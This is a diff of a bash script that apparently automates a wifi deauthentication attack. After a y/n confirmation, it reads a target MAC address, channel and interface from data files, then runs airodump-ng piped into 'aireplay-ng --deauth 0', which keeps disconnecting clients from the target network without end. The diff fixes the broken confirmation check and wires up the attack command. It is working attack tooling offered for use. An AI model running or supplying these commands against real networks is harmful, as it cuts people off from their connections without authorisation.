@@ -1,6 +1,9 @@
+#!/bin/bash
+#!/bin/sh
+
 termw=$(echo $(tput cols))
 interface=""
-function showUi() {
+function showUi () {
     if [[ $termw -ge 75 ]]; then
         cat assets/dscrpt-art.ascii
     else
@@ -75,10 +78,10 @@ if [[ $(whoami) == 'root' ]]; then
 "
             printf "\n Everything is okay?: (y/n) "
             read checker
-            if [[ checker == "y" ]]; then
-                aireplay-ng --deauth 0 -a $(cat data/target_mac.dat) $(cat data/interface.dat)
+            if [[ $checker == "y" ]]; then
+            	airodump-ng --bssid $(cat data/target_mac.dat) --channel $(cat data/target_ch.dat) $(cat data/interface.dat) | aireplay-ng --deauth 0 -a $(cat data/target_mac.dat) $(cat data/interface.dat)
             fi
-                sleep 4
+            sleep 4
             ;;
             'exit')
             break;;
